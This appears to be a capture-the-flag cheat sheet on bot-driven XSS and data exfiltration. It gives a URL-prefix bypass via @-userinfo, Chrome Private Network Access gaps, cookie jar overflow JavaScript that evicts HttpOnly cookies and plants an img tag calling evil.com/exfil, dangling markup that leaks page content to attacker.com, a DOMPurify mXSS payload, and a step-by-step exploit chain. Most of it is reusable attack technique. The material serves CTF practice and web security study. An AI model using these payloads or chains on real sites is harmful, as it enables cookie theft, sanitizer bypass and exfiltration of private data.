# Bot-Based XSS + Cookie Exfiltration Patterns

## Challenge Shape
- Internal service (e.g. port 7001) not externally accessible
- Bot (Selenium/Puppeteer) visits user-supplied URL + internal pages
- Flag on internal page, rendered only from loopback
- Must exfiltrate page content back to attacker

## Key Recon Steps

### 1. Map the bot behavior exactly
Read bot_runner source if accessible (Docker exec, source disclosure). Key details:
- What pages does the bot visit in what ORDER?
- Does the bot set/receive cookies at each step?
- What's the page_load_timeout and sleep duration?
- Does it use WebDriverWait for specific elements?

### 2. Map CSP per-endpoint
Different routes often have DIFFERENT CSPs:
- Queue/dashboard pages: `script-src 'nonce-...'` + `connect-src 'self'` (XSS-protected)
- API endpoints / error pages: `script-src 'unsafe-inline'` (the sink!)
- Status/info pages: `img-src http: https:` (exfil channel)

### 3. Identify the "sink" endpoint
Look for endpoints that:
- Return `text/html` content-type (Flask: `make_response(string)` without explicit mimetype)
- Have `script-src 'unsafe-inline'` CSP
- Contain user-controlled content in the response body
- Common pattern: API returning JSON as text/html due to missing `mimetype='application/json'`

## URL Validation Bypass: @-userinfo Trick

```
http://127.0.0.1:7000@evil.com/exploit.html
```
- Python `str.startswith("http://127.0.0.1:7000")` passes ✓
- Browser navigates to `evil.com` (userinfo is ignored, host is after @)
- Bot error "invalid argument" = Selenium webdriver (URL format issue)
- Works with any external host as the real destination

## Private Network Access (PNA) in Chrome

### What's blocked (HTTPS → private):
- `fetch()`, `XMLHttpRequest` to 127.0.0.1 from HTTPS page
- `<img>`, `<iframe>`, `<script src>` to private IPs from public HTTPS
- Error: `TypeError: Failed to fetch`

### What's NOT blocked:
- **Top-level navigation** (`window.location`, form submit with `target=_self`)
- **`window.open()`** to private IPs (new top-level browsing context)
- **`document.cookie`** assignment (DOM operation, not network)
- In **HTTP** (non-secure) contexts, PNA preflight may not be enforced

### Headless Chrome specifics:
- Popup blocking is OFF in headless mode
- `window.open()` always works without user gesture

## Cookie Jar Overflow Attack

When an HttpOnly cookie exists that you need to override:
1. Set 180+ dummy cookies for the same domain to evict oldest (HttpOnly) cookie
2. Then set your payload cookie — it's now the ONLY one with that name
3. All via `document.cookie = "..."` (no network request needed!)

```javascript
// Overflow the jar to evict the old HttpOnly "banner" cookie
for (let i = 0; i < 200; i++) {
  document.cookie = `z${i}=x; path=/status`;
}
// Now set our malicious banner cookie
document.cookie = "banner=<img src=http://evil.com/exfil?d=; path=/status";
// Navigate to the page that renders the cookie value
window.location = "http://127.0.0.1:7001/status";
```

Note: `document.cookie` works even with `connect-src 'none'` CSP (it's not a network request).
Navigation (`window.location`) is also NOT blocked by CSP.

## Dangling Markup Injection via Cookies

When a cookie value is rendered with `| safe` (Jinja2) or without escaping:

```
<img src="http://attacker.com/exfil?d=
```

This unclosed tag captures everything until the next `"` in the HTML:
```html
<p><img src="http://attacker.com/exfil?d=</p>
  Some text here
  <p>FLAG{secret_value}</p>
  ...
  <footer class="site-footer">  ← first " closes the src attribute
```

The browser sends a request to `attacker.com/exfil?d=</p>%0A...FLAG{secret_value}...`

### Status page CSP must allow img-src:
- `img-src http: https:` — dangling img tag works ✓
- `default-src 'none'` without img-src — blocked ✗

## DOMPurify 3.3.1 mXSS (CVE-2025-26791)

Affects DOMPurify < 3.3.3. Namespace confusion with math/table/mglyph:

```html
<math><mtext><table><mglyph><style><!--</style><img src=x onerror="PAYLOAD">
```

DOMPurify sees `<img>` inside `<style>` (text content, safe).
After innerHTML re-parse: `<img onerror>` becomes a real DOM element.

**Limitations:**
- Creates `<img onerror>` which IS blocked by `script-src 'nonce-...'` CSP
- Useful on pages with `script-src 'unsafe-inline'` only
- innerHTML-inserted `<script>` tags do NOT execute in any modern browser

## Flask/Werkzeug Quirks

- `request.headers.get("X-Custom-Header")` is CASE-INSENSITIVE
  - `x-desk-action: view` works same as `X-Desk-Action: view`
- `make_response(string)` without mimetype defaults to `text/html`
- Cookies are host-scoped, NOT port-scoped (shared across ports on same host)
- `secrets.token_urlsafe(18)` = 24 chars, cryptographically secure (can't predict nonces)

## Multi-Port Cookie Sharing

Browsers share cookies across ports on the same host:
- Cookie set on `127.0.0.1:7000` IS sent to `127.0.0.1:7001`
- Cookie set for `127.0.0.1` is NOT sent to `localhost` (different host)
- HttpOnly cookies can't be read/modified by JS, but JS CAN set a new cookie with same name (creating duplicates)
- Flask/Werkzeug `request.cookies.get(name)` returns FIRST occurrence in Cookie header
- Chrome cookie ordering: longer path first, then oldest first (for same path)

## Exploit Chain Template

1. Create ticket/content with JS payload on the target app
2. Find the "sink" endpoint (text/html + script-src unsafe-inline + user content)
3. Get the bot to render that endpoint as a page (needs the right headers)
4. JS executes: cookie jar overflow → set exfil cookie → navigate to flag page
5. Flag page renders with dangling markup → img request exfils flag

## Common Blockers and Solutions

| Blocker | Solution |
|---------|----------|
| URL prefix validation | @-userinfo trick |
| PNA blocks fetch to private | Top-level navigation, or get code on private origin |
| CSP connect-src 'none' | document.cookie + location (not network) |
| HttpOnly cookie can't be overwritten | Cookie jar overflow (180+ cookies evicts oldest) |
| nonce CSP blocks inline scripts | Find endpoint WITHOUT nonce (API sink) |
| Custom header required for API | Use page's own JS that already sends it (queue page) |
| DOMPurify sanitization | CVE-2025-26791 mXSS (< 3.3.3) |
